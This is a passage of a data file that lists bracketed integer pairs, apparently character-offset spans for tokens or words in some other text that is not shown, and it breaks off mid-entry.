[3530, 3532], [3533, 3535], [3536, 3547], [3548, 3550], [3551, 3554], [3555, 3556], [3557, 3568], [3569, 3575], [3576, 3583], [3584, 3586], [3587, 3592], [3592, 3593], [3596, 3601], [3602, 3605], [3606, 3613], [3613, 3614], [3615, 3620], [3620, 3623], [3623, 3629], [3629, 3630], [3630, 3633], [3633, 3634], [3634, 3645], [3645, 3646], [3646, 3657], [3658, 3669], [3670, 3677], [3677, 3678], [3679, 3690], [3691, 3695], [3696, 3704], [3705, 3707], [3708, 3718], [3719, 3728], [3728, 3729], [3730, 3732], [3733, 3735], [3736, 3745], [3746, 3748], [3749, 3756], [3757, 3760], [3761, 3768], [3769, 3771], [3772, 3773], [3774, 3784], [3785, 3791], [3792, 3797], [3798, 3806], [3807, 3809], [3810, 3817], [3818, 3821], [3822, 3835], [3836, 3838], [3839, 3844], [3845, 3852], [3853, 3858], [3859, 3870], [3871, 3877], [3878, 3888], [3888, 3889], [3890, 3894], [3895, 3899], [3900, 3909], [3910, 3912], [3913, 3917], [3917, 3918], [3919, 3921], [3922, 3926], [3927, 3932], [3933, 3937], [3938, 3944], [3945, 3958], [3959, 3961], [3962, 3965], [3966, 3972], [3973, 3977], [3978, 3980], [3981, 3992], [3992, 3993], [3994, 4004], [4005, 4016], [4017, 4025], [4026, 4030], [4031, 4037], [4038, 4040], [4041, 4043], [4044, 4055], [4056, 4065], [4066, 4069], [4070, 4074], [4075, 4078], [4079, 4086], [4087, 4097], [4098, 4107], [4107, 4108], [4110, 4124], [4124, 4125], [4125, 4132], [4133, 4140], [4141, 4144], [4145, 4150], [4151, 4161], [4162, 4170], [4171, 4173], [4174, 4185], [4186, 4188], [4189, 4190], [4191, 4195], [4196, 4198], [4199, 4204], [4205, 4212], [4213, 4220], [4221, 4229], [4230, 4232], [4233, 4239], [4240, 4243], [4244, 4249], [4250, 4264], [4265, 4268], [4269, 4277], [4278, 4290], [4290, 4291], [4292, 4296], [4297, 4299], [4300, 4307], [4308, 4316], [4317, 4326], [4326, 4327], [4328, 4335], [4336, 4343], [4344, 4346], [4347, 4353], [4354, 4355], [4356, 4363], [4364, 4367], [4368, 4376], [4377, 4382], [4382, 4383], [4384, 4389], [4390, 4394], [4395, 4398], [4399, 4407], [4408, 4410], [4411, 4416], [4417, 4420], [4421, 4428], [4429, 4431], [4432, 4439], [4440, 4447], [4448, 4450], [4451, 4455], [4456, 4457], [4458, 4461], [4462, 4467], [4468, 4470], [4471, 4477], [4478, 4482], [4482, 4483], [4484, 4489], [4490, 4493], [4494, 4498], [4499, 4506], [4507, 4512], [4513, 4523], [4524, 4527], [4528, 4536], [4537, 4541], [4542, 4545], [4546, 4548], [4549, 4553], [4554, 4556], [4557, 4560], [4561, 4563], [4564, 4573], [4574, 4575], [4576, 4583], [4584, 4586], [4587, 4588], [4589, 4596], [4597, 4608], [4608, 4609], [4610, 4611], [4612, 4621], [4622, 4623], [4623, 4624], [4625, 4630], [4631, 4634], [4635, 4641], [4642, 4657], [4658, 4667], [4668, 4685], [4686, 4687], [4688, 4690], [4690, 4696], [4696, 4697], [4697, 4700], [4700, 4702], [4724, 4725], [4725, 4732], [4732, 4733], [4733, 4736], [4736, 4738], [4760, 4761], [4761, 4772], [4772, 4773], [4773, 4776], [4776, 4778], [4800, 4801], [4801, 4809], [4809, 4810], [4810, 4813], [4813, 4815], [4837, 4838], [4838, 4846], [4846, 4847], [4847, 4850], [4850, 4852], [4874, 4875], [4875, 4883], [4883, 4884], [4884, 4887], [4887, 4889], [4911, 4912], [4912, 4919], [4919, 4920], [4920, 4923], [4923, 4925], [4947, 4948], [4948, 4955], [4955, 4956], [4956, 4959], [4959, 4961], [4962, 4979], [4980, 4981], [4982, 4992], [4992, 4993], [4993, 5005], [5005, 5007], [5007, 5015], [5015, 5017], [5018, 5028], [5028, 5030], [5030, 5036], [5036, 5039], [5039, 5044], [5044, 5046], [5047, 5051], [5052, 5056], [5057, 5068], [5069, 5075], [5076, 5078], [5079, 5086], [5087, 5096], [5097, 5101], [5102, 5105], [5106, 5114], [5115, 5125], [5126, 5130], [5131, 5138], [5139, 5151], [5152, 5154], [5155, 5162], [5163, 5171], [5172, 5175], [5176, 5183], [5183, 5184], [5185, 5189], [5190, 5201], [5202, 5205], [5206, 5208], [5209, 5216], [5217, 5219], [5220, 5231], [5232, 5239], [5240, 5243], [5244, 5248], [5249, 5251], [5252, 5259], [5260, 5262], [5263, 5264], [5265, 5274], [5275, 5277], [5278, 5288], [5289, 5300], [5301, 5307], [5308, 5312], [5313, 5315], [5316, 5317], [5318, 5325], [5326, 5332], [5333, 5340], [5340, 5341], [5342, 5343], [5344, 5353], [5354, 5355], [5355, 5356], [5357, 5362], [5363, 5365], [5366, 5373], [5374, 5376], [5377, 5378], [5379, 5388], [5389, 5396], [5397, 5408], [5409, 5427], [5428, 5429], [5430, 5432], [5432, 5438], [5438, 5441], [5442, 5443], [5443, 5453], [5453, 5456], [5457, 5458], [5458, 5466], [5466, 5469], [5470, 5471], [5471, 5479], [5479, 5482], [5483, 5484], [5484, 5492], [5492, 5495], [5496, 5497], [5497, 5505], [5505, 5508], [5531, 5532], [5532, 5540], [5540, 5543], [5544, 5545], [5545, 5553], [5553, 5556], [5557, 5558], [5558, 5566], [5566, 5569], [5570, 5571], [5571, 5579], [5579, 5582], [5583, 5584], [5584, 5592], [5592, 5595], [5596, 5597], [5597, 5605], [5605, 5608], [5631, 5632], [5632, 5641], [5641, 5644], [5645, 5646], [5646, 5655], [5655, 5658], [5659, 5660], [5660, 5669], [5669, 5672], [5673, 5674], [5674, 5683], [5683, 5686], [5687, 5688], [5688, 5697], [5697, 5700], [5701, 5702], [5702, 5711], [5711, 5714], [5715, 5723], [5724, 5725], [5726, 5732], [5732, 5733], [5733, 5746], [5746, 5747], [5747, 5753], [5753, 5754], [5754, 5765], [5765, 5768], [5769, 5773], [5774, 5776], [5777, 5780], [5781, 5784], [5785, 5788], [5789, 5793], [5794, 5798], [5799, 5808], [5809, 5812], [5813, 5818], [5819, 5821], [5822, 5829], [5830, 5834], [5835, 5836], [5837, 5847], [5848, 5852], [5853, 5855], [5856, 5863], [5864, 5873], [5874, 5883], [5884, 5894], [5895, 5899], [5900, 5909], [5910, 5922], [5922, 5923], [5924, 5926], [5927, 5930], [5931, 5936], [5937, 5939], [5940, 5947], [5948, 5955], [5956, 5959], [5960, 5962], [5963, 5966], [5967, 5976], [5977, 5979], [5980, 5983], [5984, 5988], [5988, 5989], [5990, 5992], [5993, 6001], [6002, 6006], [6007, 6010], [6011, 6018], [6019, 6024], [6025, 6027], [6028, 6031], [6032, 6034], [6035, 6036], [6037, 6046], [6047, 6058], [6058, 6059], [6060, 6064], [6065, 6069], [6070, 6073], [6074, 6079], [6080, 6084], [6085, 6088], [6089, 6091], [6092, 6096], [6097, 6099], [6100, 6105], [6106, 6115], [6116, 6119], [6120, 6121], [6122, 6131], [6132, 6133], [6133, 6134], [6135, 6140], [6141, 6144], [6145, 6156], [6157, 6160], [6161, 6169], [6170, 6178], [6179, 6180], [6181, 6188], [6188, 6189], [6189, 6201], [6201, 6203], [6204, 6228], [6229, 6230], [6231, 6233], [6233, 6243], [6243, 6245], [6246, 6247], [6247, 6250], [6250, 6252], [6253, 6254], [6254, 6257], [6257, 6259], [6260, 6261], [6261, 6264], [6264, 6266], [6267, 6268], [6268, 6270], [6270, 6272], [6273, 6275], [6276, 6279], [6279, 6280], [6280, 6287], [6288, 6290], [6291, 6300], [6300, 6301], [6301, 6306], [6306, 6308], [6309, 6312], [6313, 6320], [6321, 6323], [6324, 6348], [6348, 6350], [6355, 6361], [6362, 6366], [6369, 6373], [6374, 6376], [6377, 6380], [6381, 6384], [6385, 6392], [6393, 6398], [6399, 6401], [6402, 6406], [6407, 6411], [6412, 6418], [6419, 6422], [6423, 6437], [6438, 6440], [6441, 6450], [6451, 6454], [6455, 6458], [6459, 6467], [6467, 6468], [6469, 6471], [6472, 6476], [6477, 6480], [6481, 6488], [6489, 6495], [6496, 6502], [6503, 6505], [6506, 6514], [6515, 6526], [6527, 6532], [6533, 6536], [6537, 6540], [6540, 6541], [6542, 6545], [6546, 6550], [6551, 6558], [6559, 6560], [6561, 6565], [6566, 6568], [6569, 6580], [6581, 6584], [6585, 6593], [6594, 6597], [6598, 6602], [6603, 6609], [6610, 6612], [6613, 6616], [6617, 6619], [6620, 6625], [6626, 6634], [6635, 6638], [6639, 6646], [6647, 6649], [6650, 6653], [6654, 6657], [6658, 6671], [6672, 6679], [6680, 6685], [6685, 6686], [6687, 6689], [6690, 6693], [6694, 6701], [6702, 6704], [6705, 6710], [6710, 6711], [6712, 6715], [6716, 6720], [6721, 6728], [6729, 6733], [6733, 6734], [6735, 6745], [6746, 6749], [6750, 6758], [6759, 6761], [6762, 6776], [6776, 6777], [6778, 6779], [6780, 6789], [6790, 6791], [6791, 6792], [6793, 6798], [6799, 6801], [6802, 6806], [6807, 6811], [6812, 6814], [6815, 6822], [6823, 6827], [6828, 6830], [6831, 6833], [6834, 6850], [6851, 6852], [6853, 6855], [6857, 6859], [6860, 6863], [6863, 6864], [6864, 6867], [6867, 6868], [6868, 6872], [6872, 6873], [6874, 6875], [6876, 6877], [6877, 6878], [6883, 6899], [6900, 6901], [6902, 6907], [6907, 6908], [6908, 6911], [6911, 6912], [6912, 6917], [6917, 6918], [6918, 6920], [6922, 6923], [6923, 6924], [6925, 6940], [6940, 6941], [6942, 6943], [6944, 6945], [6946, 6954], [6954, 6955], [6955, 6973], [6973, 6975], [6977, 6989], [6990, 6991], [6992, 7007], [7008, 7009], [7010, 7020], [7022, 7024], [7025, 7037], [7038, 7039], [7040, 7056], [7056, 7057], [7062, 7068], [7069, 7074], [7075, 7076], [7077, 7084], [7085, 7089], [7089, 7090], [7095, 7101], [7102, 7106], [7107, 7108], [7109, 7112], [7113, 7120], [7121, 7125], [7126, 7130], [7131, 7137], [7138, 7140], [7141, 7144], [7145, 7149], [7150, 7154], [7155, 7157], [7158, 7165], [7166, 7170], [7171, 7172], [7173, 7182], [7183, 7192], [7193, 7194], [7194, 7196], [7197, 7199], [7200, 7202], [7203, 7210], [7210, 7212], [7213, 7215], [7216, 7220], [7221, 7224], [7225, 7233], [7233, 7234], [7234, 7252], [7252, 7254], [7255, 7263], [7264, 7266], [7267, 7275], [7276, 7279], [7280, 7284], [7285, 7289], [7290, 7292], [7293, 7298], [7298, 7299], [7300, 7302], [7303, 7311], [7312, 7315], [7316, 7320], [7321, 7323], [7324, 7333], [7334, 7336], [7337, 7345], [7346, 7348], [7349, 7351], [7352, 7362], [7363, 7364], [7364, 7367], [7368, 7374], [7375, 7377], [7378, 7383], [7384, 7386], [7387, 7388], [7389, 7397], [7397, 7399], [7400, 7405], [7406, 7415], [7416, 7419], [7420, 7424], [7425, 7429], [7430, 7432], [7433, 7442], [7443, 7445], [7446, 7449], [7450, 7459], [7460, 7476], [7476, 7477], [7478, 7480], [7481, 7484], [7485, 7489], [7490, 7494], [7495, 7497], [7498, 7505], [7505, 7506], [7507, 7510], [7511, 7515], [7516, 7523], [7524, 7529], [7529, 7530], [7531, 7538], [7538, 7539], [7540, 7542], [7543, 7546], [7547, 7551], [7552, 7556], [7557, 7562], [7563, 7568], [7569, 7572], [7573, 7580], [7581, 7590], [7590, 7591], [7592, 7594], [7595, 7602], [7603, 7607], [7607, 7608], [7609, 7618], [7619, 7623], [7624, 7627], [7628, 7634], [7635, 7641], [7642, 7646], [7647, 7651], [7652, 7662], [7663, 7670], [7671, 7678], [7679, 7681], [7682, 7688], [7689, 7693], [7694, 7699], [7700, 7706], [7707, 7708], [7709, 7711], [7712, 7723], [7724, 7726], [7727, 7728], [7729, 7736], [7736, 7737], [7739, 7741], [7742, 7748], [7749, 7751], [7752, 7757], [7758, 7762], [7763, 7768], [7769, 7779], [7780, 7783], [7784, 7789], [7790, 7798], [7799, 7802], [7803, 7812], [7813, 7824], [7825, 7834], [7835, 7837], [7838, 7841], [7842, 7847], [7848, 7850], [7851, 7858], [7859, 7870], [7871, 7874], [7875, 7882], [7883, 7892], [7892, 7893], [7895, 7900], [7901, 7903], [7904, 7911], [7911, 7912], [7914, 7916], [7917, 7928], [7929, 7937], [7938, 7942], [7942, 7943], [7944, 7947], [7948, 7951], [7952, 7955], [7956, 7959], [7960, 7962], [7963, 7972], [7972, 7973], [7974, 7978], [7979, 7984], [7985, 7995], [7996, 7998], [7999, 8004], [8005, 8009], [8010, 8016], [8017, 8019], [8020, 8027], [8028, 8029], [8030, 8032], [8033, 8037], [8038, 8042], [8043, 8045], [8046, 8052], [8053, 8055], [8056, 8060], [8061, 8063], [8064, 8071], [8072, 8075], [8076, 8084], [8085, 8092], [8092, 8093], [8094, 8101], [8101, 8102], [8103, 8112], [8113, 8120], [8121, 8131], [8132, 8134], [8135, 8145], [8146, 8157], [8158, 8166], [8167, 8171], [8172, 8180], [8180, 8181], [8181, 8184], [8185, 8188], [8189, 8197], [8197, 8198], [8199, 8201], [8202, 8207], [8208, 8213], [8214, 8216], [8217, 8221], [8222, 8224], [8225, 8232], [8232, 8233], [8234, 8238], [8239, 8245], [8246, 8248], [8249, 8258], [8258, 8259], [8260, 8266], [8267, 8275], [8276, 8278], [8279, 8287], [8288, 8294], [8295, 8301], [8301, 8302], [8303, 8305], [8306, 8307], [8308, 8315], [8316, 8322], [8323, 8326], [8327, 8332], [8333, 8335], [8336, 8344], [8345, 8355], [8356, 8363], [8364, 8365], [8365, 8369], [8369, 8371], [8373, 8375], [8376, 8385], [8386, 8394], [8395, 8401], [8402, 8404], [8405, 8412], [8412, 8413], [8414, 8417], [8418, 8426], [8427, 8435], [8436, 8444], [8445, 8448], [8449, 8453], [8454, 8460], [8461, 8463], [8464, 8467], [8468, 8475], [8475, 8476], [8477, 8484], [8485, 8487], [8488, 8495], [8496, 8501], [8502, 8509], [8510, 8514], [8515, 8518], [8519, 8526], [8527, 8536], [8536, 8537], [8539, 8542], [8543, 8554], [8554, 8557], [8562, 8565], [8565, 8568], [8569, 8572], [8573, 8576], [8577, 8580], [8581, 8585], [8586, 8591], [8592, 8597], [8598, 8605], [8605, 8608], [8614, 8617], [8617, 8618], [8627, 8633], [8634, 8645], [8654, 8660], [8661, 8675], [8693, 8696], [8697, 8698], [8699, 8700], [8700, 8705], [8705, 8708], [8708, 8716], [8716, 8717], [8717, 8720], [8720, 8721], [8721, 8724], [8724, 8725], [8725, 8732], [8732, 8733], [8742, 8743], [8744, 8745], [8746, 8754], [8754, 8755], [8755, 8758], [8758, 8759], [8759, 8762], [8762, 8763], [8773, 8775], [8776, 8778], [8778, 8789], [8790, 8792], [8793, 8796], [8796, 8797], [8810, 8817], [8818, 8819], [8820, 8822], [8822, 8826], [8826, 8827], [8827, 8832], [8832, 8834], [8834, 8836], [8836, 8838], [8847, 8851], [8852, 8854], [8854, 8865], [8866, 8868], [8869, 8872], [8872, 8873], [8886, 8890], [8890, 8892], [8893, 8894], [8895, 8897], [8898, 8902], [8902, 8903], [8904, 8907], [8908, 8914], [8915, 8918], [8919, 8922], [8923, 8926], [8927, 8931], [8931, 8932], [8937, 8943], [8943, 8944], [8953, 8957], [8957, 8962], [8963, 8968], [8968, 8969], [8970, 8975], [8976, 8979], [8980, 8983], [8984, 8987], [8988, 8991], [8992, 8995], [8995, 8997], [8998, 9000], [9001, 9003], [9004, 9007], [9008, 9011], [9011, 9012], [9013, 9015], [9016, 9020], [9021, 9029], [9030, 9032], [9033, 9037], [9038, 9039], [9040, 9049], [9050, 9054], [9055, 9057], [9058, 9066], [9067, 9070], [9071, 9081], [9082, 9084], [9085, 9088], [9089, 9096], [9097, 9100], [9101, 9108], [9109, 9119], [9120, 9123], [9124, 9134], [9135, 9143], [9144, 9146], [9147, 9155], [9156, 9160], [9161, 9163], [9164, 9172], [9172, 9173], [9173, 9176], [9176, 9177], [9178, 9188], [9188, 9189], [9189, 9192], [9193, 9195], [9196, 9203], [9204, 9212], [9212, 9213], [9214, 9216], [9217, 9223], [9224, 9235], [9236, 9238], [9239, 9250], [9251, 9254], [9255, 9261], [9262, 9264], [9265, 9272], [9273, 9282], [9283, 9286], [9287, 9290], [9291, 9299], [9300, 9303], [9304, 9309], [9310, 9315], [9316, 9320], [9321, 9323], [9324, 9330], [9330, 9331], [9332, 9344], [9344, 9345], [9346, 9350], [9351, 9353], [9354, 9359], [9360, 9369], [9370, 9374], [9375, 9380], [9381, 9384], [9385, 9394], [9395, 9398], [9399, 9406], [9407, 9409], [9410, 9419], [9420, 9423], [9423, 9424], [9425, 9434], [9435, 9438], [9439, 9451], [9452, 9455], [9456, 9463], [9464, 9468], [9469, 9472], [9473, 9479], [9480, 9489], [9489, 9490], [9491, 9493], [9494, 9503], [9504, 9508], [9509, 9517], [9517, 9518], [9519, 9521], [9522, 9527], [9528, 9532], [9533, 9536], [9537, 9547], [9548, 9550], [9551, 9559], [9560, 9565], [9566, 9569], [9570, 9573], [9574, 9579], [9579, 9580], [9581, 9591], [9592, 9595], [9596, 9600], [9601, 9603], [9604, 9612], [9613, 9614], [9615, 9624], [9625, 9628], [9629, 9631], [9632, 9635], [9636, 9646], [9647, 9653], [9654, 9660], [9660, 9661], [9662, 9666], [9667, 9674], [9675, 9687], [9688, 9696], [9697, 9701], [9702, 9710], [9711, 9722], [9723, 9733], [9733, 9734], [9735, 9737], [9738, 9745], [9746, 9753], [9753, 9754], [9755, 9757], [9758, 9763], [9764, 9768], [9769, 9780], [9781, 9782], [9783, 9792], [9793, 9801], [9802, 9806], [9807, 9813], [9814, 9817], [9818, 9821], [9822, 9829], [9830, 9832], [9833, 9836], [9837, 9844], [9844, 9845], [9846, 9848], [9849, 9853], [9854, 9855], [9856, 9865], [9866, 9872], [9872, 9873], [9874, 9878], [9879, 9886], [9887, 9889], [9890, 9898], [9899, 9902], [9903, 9910], [9911, 9913], [9914, 9917], [9918, 9921], [9922, 9930], [9931, 9933], [9934, 9937], [9938, 9946], [9947, 9958], [9959, 9969], [9969, 9970], [9971, 9983], [9983, 9984], [9985, 9987], [9988, 9993], [9994, 10005], [10006, 10007], [10008, 10015], [10016, 10022], [10023, 10028], [10029, 10035], [10036, 10039], [10040, 10046], [10046, 10047], [10048, 10054], [10055, 10061], [10062, 10065], [10066, 10072], [10073, 10080], [10081, 10085], [10086, 10089], [10090, 10096], [10097, 10103], [10104, 10111], [10112, 10114], [10115, 10122], [10123, 10125], [10126, 10129], [10130, 10132], [10133, 10138], [10139, 10146], [10147, 10157], [10157, 10158], [10159, 10163], [10164, 10169], [10170, 10172], [10173, 10175], [10176, 10182], [10183, 10191], [10192, 10198], [10199, 10201], [10202, 10209], [10210, 10214], [10215, 10217], [10218, 10227], [10228, 10233], [10234, 10236], [10237, 10244], [10245, 10247], [10248, 10254], [10255, 10260], [10261, 10267], [10267, 10268], [10269, 10273], [10274, 10282], [10283, 10285], [10286, 10293], [10294, 10302], [10303, 10315], [10316, 10319], [10320, 10329], [10330, 10343], [10343, 10344], [10346, 10350], [10351, 10356], [10357, 10363], [10364, 10366], [10367, 10374], [10375, 10387], [10388, 10391], [10392, 10396], [10397, 10402], [10403, 10411], [10412, 10415], [10416, 10426], [10427, 10430], [10431, 10439], [10440, 10445], [10445, 10446], [10448, 10451], [10452, 10459], [10460, 10471], [10472, 10477], [10478, 10486], [10487, 10491], [10491, 10492], [10493, 10498], [10498, 10501], [10501, 10513], [10513, 10514], [10514, 10517], [10517, 10518], [10518, 10526], [10527, 10529], [10530, 10533], [10534, 10538], [10538, 10539], [10540, 10542], [10543, 10548], [10549, 10558], [10559, 10562], [10563, 10569], [10570, 10572], [10573, 10580], [10581, 10582], [10583, 10593], [10594, 10600], [10601, 10603], [10604, 10607], [10608, 10611], [10612, 10614], [10615, 10617], [10618, 10624], [10625, 10635], [10635, 10636], [10637, 10641], [10642, 10644], [10645, 10654], [10655, 10657], [10658, 10660], [10661, 10664], [10665, 10669], [10670, 10673], [10674, 10678], [10679, 10686], [10686, 10687], [10688, 10692], [10693, 10696], [10697, 10703], [10704, 10709], [10710, 10712], [10713, 10721], [10722, 10725], [10726, 10732], [10732, 10733], [10733, 10736], [10737, 10740], [10740, 10741], [10742, 10744], [10745, 10753], [10754, 10755], [10756, 10762], [10763, 10768], [10768, 10769], [10770, 10775], [10776, 10785], [10786, 10787], [10788, 10794], [10795, 10800], [10801, 10813], [10814, 10815], [10816, 10819], [10820, 10825], [10826, 10832], [10833, 10837], [10837, 10838], [10839, 10841], [10842, 10846], [10847, 10851], [10852, 10854], [10855, 10863], [10864, 10866], [10867, 10872], [10873, 10881], [10882, 10884], [10885, 10887], [10888, 10891], [10892, 10897], [10897, 10898], [10900, 10907], [10908, 10911], [10912, 10919], [10920, 10924], [10925, 10930], [10931, 10936], [10937, 10939], [10940, 10951], [10952, 10960], [10961, 10965], [10965, 10966], [10967, 10970], [10971, 10976], [10977, 10981], [10982, 10987], [10988, 10990], [10991, 11000], [11001, 11005], [11005, 11006], [11007, 11009], [11010, 11014], [11015, 11023], [11023, 11024], [11025, 11030], [11031, 11036], [11037, 11038], [11039, 11046], [11047, 11055], [11056, 11058], [11059, 11065], [11065, 11066], [11067, 11070], [11071, 11075], [11076, 11077], [11078, 11084], [11085, 11090], [11090, 11091], [11092, 11094], [11095, 11099], [11100, 11102], [11103, 11108], [11109, 11117], [11118, 11127], [11128, 11131], [11132, 11137], [11138, 11140], [11141, 11146], [11147, 11151], [11151, 11152], [11154, 11156], [11157, 11164], [11165, 11169], [11169, 11170], [11171, 11176], [11177, 11184], [11185, 11188], [11189, 11194], [11195, 11198], [11199, 11205], [11206, 11208], [11209, 11211], [11212, 11213], [11214, 11226], [11227, 11234], [11235, 11239], [11240, 11250], [11250, 11251], [11251, 11254], [11255, 11258], [11259, 11265], [11266, 11270], [11271, 11279], [11280, 11283], [11284, 11291], [11292, 11295], [11296, 11302], [11303, 11307], [11308, 11318], [11319, 11322], [11323, 11328], [11328, 11329], [11330, 11334], [11335, 11345], [11346, 11353], [11354, 11362], [11363, 11366], [11367, 11373], [11374, 11383], [11383, 11384], [11385, 11393], [11394, 11397], [11398, 11404], [11405, 11414], [11415, 11418], [11419, 11430], [11431, 11433], [11434, 11437], [11438, 11443], [11443, 11444], [11445, 11451], [11452, 11454], [11455, 11456], [11457, 11466], [11467, 11477], [11478, 11487], [11488, 11491], [11492, 11497], [11498, 11504], [11505, 11509], [11510, 11513], [11514, 11520], [11521, 11534], [11535, 11538], [11539, 11543], [11544, 11554], [11554, 11555], [11556, 11558], [11559, 11561], [11562, 11563], [11564, 11568], [11569, 11571], [11572, 11575], [11576, 11588], [11589, 11596], [11597, 11599], [11600, 11606], [11607, 11613], [11614, 11627], [11627, 11628], [11628, 11629], [11630, 11632], [11633, 11641], [11642, 11651], [11652, 11655], [11656, 11668], [11668, 11669], [11670, 11675], [11676, 11679], [11680, 11684], [11685, 11691], [11692, 11695], [11696, 11698], [11699, 11703], [11704, 11707], [11708, 11712], [11713, 11723], [11724, 11727], [11728, 11738], [11738, 11739], [11740, 11742], [11743, 11750], [11751, 11766], [11767, 11770], [11771, 11780], [11781, 11783], [11784, 11788], [11789, 11791], [11792, 11801], [11802, 11812], [11813, 11817], [11818, 11819], [11820, 11827], [11828, 11842], [11843, 11847], [11848, 11849], [11849, 11852], [11852, 11854], [11855, 11858], [11859, 11865], [11866, 11871], [11872, 11878], [11879, 11887], [11888, 11891], [11892, 11901], [11902, 11906], [11907, 11910], [11911, 11912], [11913, 11922], [11923, 11925], [11926, 11933], [11934, 11943], [11943, 11944], [11945, 11947], [11948, 11956], [11957, 11958], [11959, 11974], [11975, 11978], [11979, 11985], [11986, 11989], [11990, 11992], [11993, 12000], [12001, 12004], [12005, 12017], [12018, 12022], [12022, 12023], [12024, 12030], [12031, 12033], [12034, 12042], [12043, 12046], [12047, 12054], [12055, 12067], [12068, 12072], [12073, 12080], [12081, 12087], [12088, 12101], [12102, 12105], [12106, 12113], [12113, 12114], [12116, 12119], [12120, 12134], [12134, 12135], [12135, 12151], [12151, 12152], [12153, 12161], [12161, 12163], [12168, 12171], [12171, 12178], [12179, 12184], [12185, 12189], [12190, 12195], [12195, 12198], [12204, 12207], [12207, 12208], [12217, 12220], [12221, 12222], [12223, 12249], [12249, 12250], [12250, 12258], [12258, 12259], [12268, 12274], [12275, 12276], [12277, 12283], [12283, 12284], [12284, 12287], [12287, 12288], [12297, 12314], [12315, 12316], [12317, 12323], [12323, 12324], [12324, 12331], [12331, 12332], [12332, 12348], [12348, 12349], [12359, 12365], [12366, 12383], [12383, 12384], [12384, 12390], [12390, 12392], [12397, 12403], [12403, 12404], [12413, 12417], [12417, 12422], [12423, 12428], [12428, 12429], [12430, 12435], [12436, 12439], [12440, 12447], [12448, 12452], [12453, 12458], [12458, 12460], [12462, 12465], [12466, 12480], [12480, 12483], [12488, 12491], [12491, 12494], [12495, 12499], [12500, 12505], [12506, 12510], [12511, 12516], [12517, 12522], [12523, 12530], [12530, 12533], [12539, 12542], [12542, 12543], [12560, 12563], [12564, 12565], [12566, 12567], [12567, 12572], [12572, 12575], [12575, 12583], [12583, 12584], [12584, 12587], [12587, 12588], [12588, 12591], [12591, 12592], [12592, 12598], [12598, 12599], [12608, 12609], [12610, 12611], [12612, 12620], [12620, 12621], [12621, 12624], [12624, 12625], [12625, 12628], [12628, 12629], [12639, 12641], [12642, 12644], [12644, 12655], [12656, 12658], [12659, 12662], [12662, 12663], [12676, 12696], [12697, 12698], [12699, 12700], [12700, 12708], [12708, 12710], [12723, 12735], [12736, 12737], [12738, 12740], [12740, 12744], [12744, 12745], [12745, 12750], [12750, 12752], [12752, 12754], [12754, 12756], [12782, 12788], [12789, 12803], [12803, 12804], [12804, 12816], [12816, 12817], [12818, 12838], [12838, 12839], [12849, 12853], [12854, 12856], [12856, 12867], [12868, 12870], [12871, 12874], [12874, 12875], [12888, 12889], [12890, 12894], [12895, 12897], [12898, 12903], [12904, 12910], [12911, 12912], [12913, 12920], [12921, 12923], [12924, 12925], [12926, 12932], [12933, 12938], [12939, 12941], [12942, 12944], [12945, 12953], [12954, 12956], [12957, 12960], [12961, 12966], [12967, 12969], [12970, 12973], [12974, 12978], [12979, 12981], [12982, 12985], [12986, 12991], [13004, 13005], [13006, 13007], [13008, 13011], [13012, 13023], [13024, 13031], [13032, 13033], [13046, 13050], [13050, 13052], [13053, 13054], [13055, 13057], [13058, 13062], [13062, 13063], [13064, 13067], [13068, 13074], [13075, 13078], [13079, 13082], [13083, 13086], [13087, 13091], [13091, 13092], [13097, 13103], [13103, 13104], [13113, 13117], [13117, 13122], [13123, 13128], [13128, 13129], [13130, 13135], [13136, 13139], [13140, 13143], [13144, 13148], [13149, 13154], [13154, 13156], [13158, 13161], [13162, 13170], [13171, 13175], [13176, 13184], [13185, 13188], [13189, 13198], [13198, 13199], [13200, 13214], [13215, 13218], [13219, 13233], [13233, 13234], [13235, 13238], [13239, 13253], [13254, 13262], [13263, 13271], [13272, 13274], [13275, 13284], [13285, 13291], [13292, 13304], [13305, 13308], [13309, 13314], [13315, 13319], [13320, 13325], [13326, 13331], [13332, 13333], [13334, 13342], [13343, 13351], [13351, 13352], [13353, 13355], [13356, 13363], [13364, 13367], [13368, 13377], [13378, 13385], [13386, 13388], [13389, 13390], [13391, 13398], [13399, 13405], [13405, 13406], [13407, 13410], [13411, 13425], [13426, 13434], [13435, 13444], [13445, 13448], [13449, 13453], [13454, 13459], [13460, 13464], [13465, 13466], [13467, 13478], [13479, 13486], [13486, 13487], [13488, 13490], [13491, 13495], [13496, 13503], [13504, 13512], [13512, 13513], [13514, 13516], [13517, 13523], [13524, 13527], [13528, 13536], [13537, 13543], [13544, 13548], [13549, 13552], [13553, 13561], [13562, 13573], [13573, 13574], [13575, 13577], [13578, 13581], [13582, 13590], [13591, 13593], [13594, 13604], [13604, 13605], [13606, 13608], [13609, 13612], [13613, 13616], [13617, 13625], [13626, 13634], [13635, 13638], [13639, 13649], [13650, 13655], [13656, 13659], [13660, 13674], [13675, 13683], [13683, 13684], [13685, 13688], [13689, 13696], [13697, 13700], [13701, 13710], [13711, 13715], [13716, 13721], [13721, 13722], [13723, 13725], [13726, 13729], [13730, 13738], [13739, 13745], [13746, 13750], [13751, 13753], [13754, 13757], [13757, 13758], [13759, 13761], [13762, 13765], [13766, 13769], [13770, 13776], [13777, 13779], [13780, 13789], [13790, 13793], [13794, 13796], [13797, 13802], [13803, 13809], [13810, 13811], [13812, 13821], [13822, 13823], [13824, 13830], [13831, 13836], [13837, 13840], [13841, 13853], [13854, 13862], [13863, 13864], [13865, 13870], [13871, 13879], [13880, 13887], [13888, 13893], [13894, 13897], [13898, 13911], [13911, 13912], [13913, 13923], [13924, 13927], [13928, 13937], [13938, 13941], [13942, 13950], [13951, 13961], [13962, 13971], [13972, 13976], [13977, 13983], [13984, 13986], [13987, 13996], [13997, 14000], [14001, 14008], [14009, 14012], [14013, 14025], [14026, 14028], [14029, 14034], [14035, 14042], [14042, 14043], [14045, 14050], [14051, 14055], [14056, 14063], [14064, 14066], [14067, 14073], [14074, 14085], [14086, 14092], [14093, 14095], [14095, 14096], [14098, 14103], [14103, 14106], [14106, 14112], [14112, 14113], [14113, 14116], [14116, 14117], [14117, 14128], [14128, 14129], [14129, 14140], [14140, 14141], [14141, 14145], [14145, 14146], [14146, 14150], [14150, 14151], [14151, 14168], [14168, 14169], [14169, 14171], [14173, 14184], [14185, 14192], [14192, 14193], [14194, 14200], [14201, 14203], [14204, 14210], [14211, 14217], [14218, 14224], [14225, 14227], [14228, 14229], [14230, 14241], [14242, 14250], [14251, 14254], [14255, 14261], [14261, 14262], [14263, 14267], [14268, 14276], [14277, 14279], [14280, 14287], [14288, 14294], [14295, 